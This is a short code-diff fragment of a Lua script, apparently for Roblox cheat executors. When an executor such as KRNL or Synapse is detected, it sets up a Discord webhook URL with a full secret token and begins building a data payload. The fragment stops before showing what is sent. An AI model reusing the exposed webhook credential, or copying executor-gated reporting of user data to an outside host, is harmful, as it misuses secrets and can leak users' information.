@@ -1,5 +1,3 @@
-j
-
 if KRNL_LOADED or syn or is_sirhurt_closure or secure_load then
     local webhookURL = "https://discord.com/api/webhooks/1066062166500839547/YXCtw-w4v7o-kamENw53-6nTXAl6yRRmiNvB_rdKPp_XSZdjOa0HFy7rnuXn2niBcAw4" -- please dont spam this webhook
     local data = {
